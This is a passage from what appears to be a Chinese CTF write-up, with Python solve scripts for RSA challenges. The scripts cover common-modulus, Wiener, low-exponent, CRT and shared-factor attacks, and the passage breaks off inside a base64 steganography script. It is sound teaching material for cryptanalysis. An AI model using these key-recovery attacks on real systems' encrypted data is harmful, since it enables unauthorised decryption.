e<span class="token operator">=</span><span class="token number">17</span>
d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h1 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h1><p>题目给出了RSA的相关参数，直接求解<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2

p <span class="token operator">=</span> 
q <span class="token operator">=</span> 
e <span class="token operator">=</span> 
c <span class="token operator">=</span> 
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q
<span class="token keyword">print</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h1 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h1><ul>
<li>p，q，dp，dq，c</li>
</ul>
<p>脚本如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> libnum
p <span class="token operator">=</span> 
q <span class="token operator">=</span> 
dp <span class="token operator">=</span> 
dq <span class="token operator">=</span> 
c <span class="token operator">=</span> 

n <span class="token operator">=</span> p<span class="token operator">*</span>q
phi <span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
dd <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>

d<span class="token operator">=</span><span class="token punctuation">(</span>dp<span class="token operator">-</span>dq<span class="token punctuation">)</span><span class="token operator">//</span>dd <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>dd<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>dd<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> dq

m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h1><ul>
<li>e，n，c，dp</li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> libnum

e <span class="token operator">=</span> 
n <span class="token operator">=</span> 
c <span class="token operator">=</span> 
dp <span class="token operator">=</span> 

<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token operator">*</span>dp<span class="token operator">%</span>x<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        	p<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token operator">*</span>dp<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>x<span class="token operator">+</span><span class="token number">1</span>
        	<span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span>p<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        	    <span class="token keyword">continue</span>
        	q<span class="token operator">=</span>n<span class="token operator">//</span>p
        	phin<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        	d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phin<span class="token punctuation">)</span>
        	m<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
        	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        	    <span class="token keyword">continue</span>
            <span class="token keyword">print</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h1><ul>
<li>共模攻击</li>
<li>n，e1，e2，c1，c2</li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> libnum

n<span class="token operator">=</span>
e1<span class="token operator">=</span>
e2<span class="token operator">=</span>
c1<span class="token operator">=</span>
c2<span class="token operator">=</span>

gcd<span class="token punctuation">,</span> s<span class="token punctuation">,</span> t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span> <span class="token comment">#扩展欧几里得算法</span>
<span class="token keyword">if</span> s <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
	s <span class="token operator">=</span> <span class="token operator">-</span>s
	c1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">if</span> t <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
	t <span class="token operator">=</span> <span class="token operator">-</span>t
	c2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>

m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span>t<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">%</span> n
<span class="token keyword">print</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA"></a>RSA</h1><ul>
<li><p>openssl的使用</p>
<p><a href="https://github.com/ius/rsatool">rsatool</a></p>
</li>
</ul>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># openssl rsa -pubin -text -modulus -in warmup -in pub.key

# pyhton rsatool.py -o private.pem -e &#39;&#39; -p &#39;&#39; -q &#39;&#39;

# openssl rsautl -decrypt -in flag.enc -inkey private.pem<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="RSAROLL"><a href="#RSAROLL" class="headerlink" title="RSAROLL"></a>RSAROLL</h1><ul>
<li>给出多个密文，逐一解密<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
n <span class="token operator">=</span> <span class="token number">920139713</span>
q <span class="token operator">=</span> <span class="token number">18443</span>
p <span class="token operator">=</span> <span class="token number">49891</span>
e <span class="token operator">=</span> <span class="token number">19</span>
d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e <span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  

c <span class="token operator">=</span> <span class="token triple-quoted-string string">'''704796792
752211152
274704164
18414022
368270835
483295235
263072905
459788476
483295235
459788476
663551792
475206804
459788476
428313374
475206804
459788476
425392137
704796792
458265677
341524652
483295235
534149509
425392137
428313374
425392137
341524652
458265677
263072905
483295235
828509797
341524652
425392137
475206804
428313374
483295235
475206804
459788476
306220148'''</span>
falg <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	falg <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> falg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h1 id="Dangerous-RSA"><a href="#Dangerous-RSA" class="headerlink" title="Dangerous RSA"></a>Dangerous RSA</h1><ul>
<li>低加密指数攻击（e=3）</li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> libnum

c <span class="token operator">=</span>
n <span class="token operator">=</span> 
e <span class="token operator">=</span> <span class="token number">3</span>

m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h1><ul>
<li>低解密指数攻击（e非常大）<br><a href="https://github.com/pablocelayes/rsa-wiener-attack">rsa-wiener-attack</a><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> ContinuedFractions<span class="token punctuation">,</span> Arithmetic<span class="token punctuation">,</span> RSAvulnerableKeyGenerator

<span class="token keyword">def</span> <span class="token function">hack_RSA</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    
    <span class="token comment"># Finds d knowing(e,n)</span>
    <span class="token comment"># applying the Wiener continued fraction attack</span>
    
    frac <span class="token operator">=</span> ContinuedFractions<span class="token punctuation">.</span>rational_to_contfrac<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    convergents <span class="token operator">=</span> ContinuedFractions<span class="token punctuation">.</span>convergents_from_contfrac<span class="token punctuation">(</span>frac<span class="token punctuation">)</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>k<span class="token punctuation">,</span>d<span class="token punctuation">)</span> <span class="token keyword">in</span> convergents<span class="token punctuation">:</span>
        
	<span class="token comment"># check if d is actually the key</span>
	<span class="token keyword">if</span> k<span class="token operator">!=</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
	    phi <span class="token operator">=</span> <span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>k
	    s <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span>
	    <span class="token comment"># check if the equation x^2 - s*x + n = 0</span>
	    <span class="token comment"># has integer</span>
	    discr <span class="token operator">=</span> s<span class="token operator">*</span>s <span class="token operator">-</span> <span class="token number">4</span><span class="token operator">*</span>n
	    <span class="token keyword">if</span><span class="token punctuation">(</span>discr <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		t <span class="token operator">=</span> Arithmetic<span class="token punctuation">.</span>is_perfect_square<span class="token punctuation">(</span>discr<span class="token punctuation">)</span>
		<span class="token keyword">if</span> t<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>s<span class="token operator">+</span>t<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
		    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hacked!"</span><span class="token punctuation">)</span>
		    <span class="token keyword">return</span> d
        
n <span class="token operator">=</span>
e <span class="token operator">=</span> 
d <span class="token operator">=</span> hack_RSA<span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">"flag&#123;"</span> <span class="token operator">+</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&#125;"</span>
<span class="token keyword">print</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h1 id="RSA5"><a href="#RSA5" class="headerlink" title="RSA5"></a>RSA5</h1><p>题目给出了20对n，c</p>
<p>先将20个n两两取最大公因数，即可得到p（q），然后选取得到这个最大公因数的两个n中的其中一个，即可得到另一个素数</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span><span class="token operator">=</span><span class="token punctuation">[</span>n<span class="token punctuation">,</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">,</span>n3<span class="token punctuation">,</span>n4<span class="token punctuation">,</span>n5<span class="token punctuation">,</span>n6<span class="token punctuation">,</span>n7<span class="token punctuation">,</span>n8<span class="token punctuation">,</span>n9<span class="token punctuation">,</span>n10<span class="token punctuation">,</span>n11<span class="token punctuation">,</span>n12<span class="token punctuation">,</span>n13<span class="token punctuation">,</span>n14<span class="token punctuation">,</span>n15<span class="token punctuation">,</span>n16<span class="token punctuation">,</span>n17<span class="token punctuation">,</span>n18<span class="token punctuation">,</span>n19<span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">print</span> i<span class="token punctuation">,</span>j
	<span class="token keyword">try</span><span class="token punctuation">:</span>  
	    <span class="token keyword">print</span> <span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token builtin">list</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token keyword">except</span><span class="token punctuation">:</span>
	    <span class="token keyword">print</span> <span class="token string">"error "</span><span class="token punctuation">,</span>i
	<span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我这选的是n4，q=n4/p</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">p<span class="token operator">=</span>
q<span class="token operator">=</span>n4<span class="token operator">/</span>p
e <span class="token operator">=</span> <span class="token number">65537</span>
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
nn <span class="token operator">=</span> p <span class="token operator">*</span> q
<span class="token keyword">print</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c4<span class="token punctuation">,</span>d<span class="token punctuation">,</span>nn<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="SameMod"><a href="#SameMod" class="headerlink" title="SameMod"></a>SameMod</h1><ul>
<li>共模攻击</li>
</ul>
<p>脚本跟RSA3相同，但解出的m需要用ASCII码解<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">string <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
flag<span class="token operator">=</span><span class="token string">''</span>
i<span class="token operator">=</span><span class="token number">0</span>
j<span class="token operator">=</span><span class="token number">1</span>
<span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>string<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">33</span> <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>string<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">:</span>
        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>string<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        i<span class="token operator">=</span>i<span class="token operator">+</span>j
        j<span class="token operator">=</span><span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        j<span class="token operator">+=</span><span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h1 id="RSA4"><a href="#RSA4" class="headerlink" title="RSA4"></a>RSA4</h1><ul>
<li>中国剩余定理</li>
</ul>
<p>使用中国剩余定理求解，但之前需做些转换，题目给出的n和c是5进制的<br>求出m之后转换出错，估计不是直接模的n，然后猜测e=3，开个根即可</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> libnum
n1<span class="token operator">=</span>  
c1<span class="token operator">=</span> 

n2<span class="token operator">=</span>  
c2<span class="token operator">=</span> 

n3<span class="token operator">=</span>  
c3<span class="token operator">=</span> 

ms<span class="token operator">=</span><span class="token punctuation">[</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">,</span>n3<span class="token punctuation">]</span>
cs<span class="token operator">=</span><span class="token punctuation">[</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>c3<span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ms<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ms<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    cs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>cs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">CRT</span><span class="token punctuation">(</span>bs<span class="token punctuation">,</span>ms<span class="token punctuation">)</span><span class="token punctuation">:</span>
    m <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> x<span class="token operator">*</span>y<span class="token punctuation">,</span> ms<span class="token punctuation">)</span>
    re <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        M <span class="token operator">=</span> m <span class="token operator">/</span> ms<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        gcd<span class="token punctuation">,</span> n1<span class="token punctuation">,</span> M1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>ms<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> M<span class="token punctuation">)</span><span class="token comment"># ms[i]*n1 + M*M1 = 1</span>
        re <span class="token operator">+=</span> bs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> M <span class="token operator">*</span> M1
    <span class="token keyword">return</span> re <span class="token operator">%</span> m

m <span class="token operator">=</span> CRT<span class="token punctuation">(</span>cs<span class="token punctuation">,</span>ms<span class="token punctuation">)</span>
mm <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>mm<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="RSA-amp-what"><a href="#RSA-amp-what" class="headerlink" title="RSA&amp;what"></a>RSA&amp;what</h1><ul>
<li>共模攻击</li>
<li>base64隐写</li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> libnum

n<span class="token operator">=</span>
e1<span class="token operator">=</span>
e2<span class="token operator">=</span>
cc1<span class="token operator">=</span>
cc2<span class="token operator">=</span>

<span class="token keyword">def</span> <span class="token function">samemod</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    gcd<span class="token punctuation">,</span> s<span class="token punctuation">,</span> t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span> 
    <span class="token keyword">if</span> s <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> <span class="token operator">-</span>s
	c1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">if</span> t <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        t <span class="token operator">=</span> <span class="token operator">-</span>t
        c2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>

    m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span>t<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">%</span> n
    <span class="token keyword">return</span> m


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cc1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>samemod<span class="token punctuation">(</span>cc1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>cc2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在将结果写进txt时，注意将base64合并一下，确保每行结尾为’=’<br>base64隐写脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#https://www.jianshu.com/p/48fe4dd3e5ce</span>
<span class="token keyword">def</span> <span class="token function">get_base64_diff_value</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    base64chars <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>
    res <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
